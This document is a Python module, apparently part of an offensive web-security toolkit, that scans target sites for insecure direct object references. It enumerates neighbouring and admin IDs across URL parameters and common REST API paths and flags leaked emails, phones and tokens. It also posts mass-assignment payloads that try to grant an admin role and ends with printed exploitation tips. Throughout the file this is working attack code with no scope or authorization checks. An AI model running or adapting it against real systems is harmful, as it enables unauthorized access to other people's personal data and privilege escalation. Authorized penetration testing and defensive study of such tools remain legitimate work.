"""
idor_scanner.py — Ultra IDOR (Insecure Direct Object Reference) Scanner
Features: ID fuzzing, UUID enumeration, predictable ID detection,
          horizontal/vertical privilege escalation, API endpoint testing,
          response comparison, mass assignment detection
"""

import re
import uuid
import time
import hashlib
import threading
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

from ui.rich_ui import (
    console, info, warning, error, found, success, section_header, print_summary
)

TIMEOUT    = 10
DELAY      = 0.2
MAX_WORKERS = 20

# ── Common IDOR parameters ────────────────────────────────────────────────────
IDOR_PARAMS = [
    "id", "user_id", "userid", "uid", "user", "account", "account_id",
    "profile_id", "profileid", "member_id", "memberid", "customer_id",
    "customerid", "order_id", "orderid", "invoice_id", "invoiceid",
    "doc_id", "docid", "file_id", "fileid", "document_id", "documentid",
    "ticket_id", "ticketid", "report_id", "reportid", "message_id",
    "messageid", "post_id", "postid", "comment_id", "commentid",
    "product_id", "productid", "item_id", "itemid", "record_id",
    "recordid", "object_id", "objectid", "ref", "reference",
    "key", "token", "hash", "slug", "name", "username", "email",
    "phone", "ssn", "dob", "number", "no", "num", "pid",
    "transaction_id", "payment_id", "session_id", "request_id",
]

# ── ID generation strategies ──────────────────────────────────────────────────
def _generate_ids(base_id: str) -> List[str]:
    """Generate adjacent/predictable IDs."""
    ids = []

    # Numeric IDs
    try:
        n = int(base_id)
        # Adjacent
        for delta in range(-10, 11):
            if delta != 0:
                ids.append(str(n + delta))
        # Common admin IDs
        ids.extend(["0", "1", "2", "3", "100", "1000", "admin", "root"])
        # Powers of 2
        ids.extend(["128", "256", "512", "1024"])
    except ValueError:
        pass

    # UUID-based
    try:
        u = uuid.UUID(base_id)
        # Generate sequential UUIDs
        for i in range(1, 6):
            ids.append(str(uuid.UUID(int=u.int + i)))
            ids.append(str(uuid.UUID(int=u.int - i)))
        # Nil UUID
        ids.append(str(uuid.UUID(int=0)))
    except ValueError:
        pass

    # Hash-like (MD5/SHA1)
    if re.match(r'^[a-f0-9]{32}$', base_id):
        # Try common strings
        for s in ["admin", "1", "2", "user", "test", "0"]:
            ids.append(hashlib.md5(s.encode()).hexdigest())
            ids.append(hashlib.sha1(s.encode()).hexdigest()[:32])

    # Base64-like
    if re.match(r'^[A-Za-z0-9+/=]{8,}$', base_id):
        import base64
        try:
            decoded = base64.b64decode(base_id + "==").decode("utf-8", errors="ignore")
            try:
                n = int(decoded)
                for delta in [-1, 1, -2, 2]:
                    ids.append(base64.b64encode(str(n + delta).encode()).decode())
            except ValueError:
                pass
        except Exception:
            pass

    return list(set(ids))[:30]


def _session(token: str = None) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 Chrome/120.0",
        "Accept":     "application/json, text/html, */*",
    })
    if token:
        s.headers["Authorization"] = f"Bearer {token}"
    return s


def _compare_responses(r1: requests.Response, r2: requests.Response) -> Dict:
    """Compare two responses to detect IDOR."""
    result = {
        "different":     False,
        "status_diff":   r1.status_code != r2.status_code,
        "size_diff":     abs(len(r1.text) - len(r2.text)),
        "content_diff":  False,
        "leaked_data":   [],
    }

    # Status code difference
    if result["status_diff"]:
        result["different"] = True

    # Significant size difference
    if result["size_diff"] > 50:
        result["different"] = True
        result["content_diff"] = True

    # Look for sensitive data in new response
    sensitive_patterns = [
        (r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", "email"),
        (r"\b\d{3}[-.]?\d{3}[-.]?\d{4}\b", "phone"),
        (r"\b[A-Z]{2}\d{6,9}\b", "ID number"),
        (r'"password"\s*:', "password field"),
        (r'"token"\s*:\s*"[^"]{10,}"', "token"),
        (r'"ssn"\s*:', "SSN"),
        (r'"credit_card"\s*:', "credit card"),
        (r'\$\d+\.\d{2}', "amount"),
        (r'"address"\s*:', "address"),
        (r'"phone"\s*:', "phone field"),
    ]

    for pattern, data_type in sensitive_patterns:
        matches_r2 = re.findall(pattern, r2.text, re.I)
        matches_r1 = re.findall(pattern, r1.text, re.I)
        new_matches = [m for m in matches_r2 if m not in matches_r1]
        if new_matches:
            result["leaked_data"].append({
                "type":    data_type,
                "samples": new_matches[:3],
            })
            result["different"] = True

    return result


def _test_idor_param(url: str, param: str, base_value: str,
                     token: str = None) -> List[Dict]:
    """Test IDOR on a specific parameter."""
    findings = []
    session  = _session(token)

    # Get baseline response
    try:
        baseline = session.get(url, timeout=TIMEOUT, verify=False)
    except Exception:
        return []

    # Generate test IDs
    test_ids = _generate_ids(base_value)
    if not test_ids:
        # Default numeric IDs if no base found
        test_ids = [str(i) for i in range(1, 20)] + ["admin", "root", "0"]

    for test_id in test_ids[:20]:
        test_url = _inject_param(url, param, test_id)
        try:
            r = session.get(test_url, timeout=TIMEOUT, verify=False)

            comparison = _compare_responses(baseline, r)
            if comparison["different"] and r.status_code in (200, 201):
                finding = {
                    "type":      "IDOR",
                    "url":       test_url,
                    "param":     param,
                    "original":  base_value,
                    "test_id":   test_id,
                    "status":    r.status_code,
                    "size_diff": comparison["size_diff"],
                    "leaked":    comparison["leaked_data"],
                    "severity":  "HIGH" if comparison["leaked_data"] else "MEDIUM",
                }
                findings.append(finding)
                found(
                    f"[bold red][IDOR][/bold red]  "
                    f"param={param}  id={base_value}→{test_id}  "
                    f"size_diff={comparison['size_diff']}"
                )
                if comparison["leaked_data"]:
                    for leak in comparison["leaked_data"]:
                        console.print(f"  [red]Leaked {leak['type']}: {leak['samples'][:2]}[/red]")

        except Exception:
            pass
        time.sleep(DELAY)

    return findings


def _inject_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [value]
    new_query = urlencode({k: v[0] for k, v in params.items()})
    return urlunparse(parsed._replace(query=new_query))


def _test_api_idor(base_url: str, token: str = None) -> List[Dict]:
    """Test common REST API IDOR patterns."""
    findings = []
    session  = _session(token)

    # Common API patterns
    api_patterns = [
        "/api/users/{id}",
        "/api/user/{id}",
        "/api/account/{id}",
        "/api/profile/{id}",
        "/api/orders/{id}",
        "/api/documents/{id}",
        "/api/files/{id}",
        "/api/admin/users/{id}",
        "/api/v1/users/{id}",
        "/api/v2/users/{id}",
        "/users/{id}",
        "/user/{id}",
        "/profile/{id}",
        "/account/{id}",
        "/orders/{id}",
        "/invoice/{id}",
    ]

    test_ids = ["1", "2", "3", "0", "100", "admin",
                str(uuid.uuid4()), "00000000-0000-0000-0000-000000000001"]

    for pattern in api_patterns:
        for test_id in test_ids[:5]:
            url = urljoin(base_url, pattern.replace("{id}", test_id))
            try:
                r = session.get(url, timeout=5, verify=False)
                if r.status_code == 200 and len(r.text) > 20:
                    # Check if it returns user data
                    if any(key in r.text.lower() for key in
                           ["email", "username", "name", "phone", "address", "password"]):
                        findings.append({
                            "type":     "API IDOR",
                            "url":      url,
                            "param":    "path_id",
                            "test_id":  test_id,
                            "status":   r.status_code,
                            "response": r.text[:200],
                            "severity": "HIGH",
                        })
                        found(f"[bold red][API IDOR][/bold red]  {url}")
                        console.print(f"  [red]{r.text[:150]}[/red]")
                        break
            except Exception:
                pass
            time.sleep(DELAY)

    return findings


def _test_mass_assignment(base_url: str, token: str = None) -> List[Dict]:
    """Test for mass assignment / parameter pollution."""
    findings = []
    session  = _session(token)

    # Try to assign admin role via POST/PUT
    mass_payloads = [
        {"role": "admin", "is_admin": True, "admin": 1},
        {"role": "administrator"},
        {"is_admin": "true", "admin": "true"},
        {"privilege": "admin", "level": 0},
        {"group_id": 1, "role_id": 1},
        {"user_type": "admin", "account_type": "premium"},
    ]

    endpoints = ["/api/user", "/api/profile", "/api/account",
                 "/user/update", "/profile/update", "/account/settings"]

    for endpoint in endpoints:
        url = urljoin(base_url, endpoint)
        for payload in mass_payloads[:3]:
            try:
                r = session.post(url, json=payload, timeout=5, verify=False)
                if r.status_code in (200, 201, 204):
                    if any(k in r.text.lower() for k in ["admin", "role", "privilege"]):
                        findings.append({
                            "type":     "Mass Assignment",
                            "url":      url,
                            "payload":  str(payload),
                            "status":   r.status_code,
                            "response": r.text[:200],
                            "severity": "HIGH",
                        })
                        found(f"[bold red][Mass Assignment][/bold red]  {url}")
            except Exception:
                pass

    return findings


def _get_urls_with_id_params(base_url: str) -> List[Tuple[str, str, str]]:
    """Find URLs with ID-like parameters."""
    combos = []
    try:
        r = _session().get(base_url, timeout=TIMEOUT, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")

        for a in soup.find_all("a", href=True):
            href = urljoin(base_url, a["href"])
            if "?" in href and base_url.split("/")[2] in href:
                params = parse_qs(urlparse(href).query)
                for p, vals in params.items():
                    if p.lower() in IDOR_PARAMS or re.match(r'^(id|.*_id|.*id)$', p.lower()):
                        combos.append((href, p, vals[0] if vals else "1"))

        # Also check path-based IDs
        for a in soup.find_all("a", href=True):
            href = a["href"]
            m = re.search(r'/(\d+)(?:/|$|\?)', href)
            if m:
                full = urljoin(base_url, href)
                combos.append((full, "path_id", m.group(1)))

    except Exception:
        pass

    # Add common IDOR params with default value
    for param in IDOR_PARAMS[:10]:
        combos.append((f"{base_url}?{param}=1", param, "1"))

    return combos


def run_idor_scanner(target: str, token: str = None) -> Dict:
    section_header("IDOR Scanner", "Ultra ID Fuzzing | API | Mass Assignment | Priv Escalation")
    info(f"Target: {target}")

    if token:
        success("Auth token provided — testing authenticated endpoints")
    else:
        warning("No auth token — testing unauthenticated endpoints only")
        console.print("  [dim]Tip: Set token via IDOR_TOKEN env var for better results[/dim]")
        import os
        token = os.environ.get("IDOR_TOKEN")

    base_url = target if target.startswith("http") else f"https://{target}"
    all_findings: List[Dict] = []

    # 1. URL parameter IDOR
    info("Discovering ID parameters...")
    combos = _get_urls_with_id_params(base_url)
    info(f"Found {len(combos)} ID parameter combinations")

    for url, param, base_val in combos[:20]:
        info(f"Testing: param={param} base_id={base_val} url={url[:50]}")
        results = _test_idor_param(url, param, base_val, token)
        all_findings.extend(results)

    # 2. API endpoint IDOR
    info("Testing REST API IDOR patterns...")
    api_findings = _test_api_idor(base_url, token)
    all_findings.extend(api_findings)

    # 3. Mass assignment
    info("Testing mass assignment...")
    mass_findings = _test_mass_assignment(base_url, token)
    all_findings.extend(mass_findings)

    # Print results
    console.print(f"\n[bold cyan]━━━ IDOR FINDINGS ({len(all_findings)}) ━━━[/bold cyan]")
    for f in all_findings:
        color = "bold red" if f["severity"] == "HIGH" else "yellow"
        console.print(f"\n  [{color}][{f['type']}][/{color}]")
        console.print(f"  URL:       {f.get('url','')[:80]}")
        console.print(f"  Param:     {f.get('param','')}")
        if f.get("original"):
            console.print(f"  ID:        {f['original']} → {f.get('test_id','')}")
        if f.get("leaked"):
            console.print(f"  [red]Leaked Data:[/red]")
            for leak in f["leaked"]:
                console.print(f"    • {leak['type']}: {leak['samples'][:2]}")
        if f.get("response"):
            console.print(f"  Response:  [dim]{f['response'][:100]}[/dim]")

    # Impact explanation
    console.print("\n[bold yellow]━━━ EXPLOITATION TIPS ━━━[/bold yellow]")
    console.print("  • Horizontal: Access other users' data (same privilege)")
    console.print("  • Vertical:   Access admin data (higher privilege)")
    console.print("  • Use Burp Intruder to fuzz IDs 1-10000")
    console.print("  • Try GUIDs, hashed IDs, encoded IDs")
    console.print("  • Test DELETE/PUT methods on other users' objects")
    console.print("  • Check API v1 if v2 is patched")

    print_summary("IDOR Scanner", {
        "Params Tested":   len(combos[:20]),
        "Total Found":     len(all_findings),
        "URL IDOR":        sum(1 for f in all_findings if f["type"] == "IDOR"),
        "API IDOR":        sum(1 for f in all_findings if "API" in f["type"]),
        "Mass Assignment": sum(1 for f in all_findings if "Mass" in f["type"]),
        "Data Leaked":     sum(1 for f in all_findings if f.get("leaked")),
    })

    return {"findings": all_findings, "total": len(all_findings)}
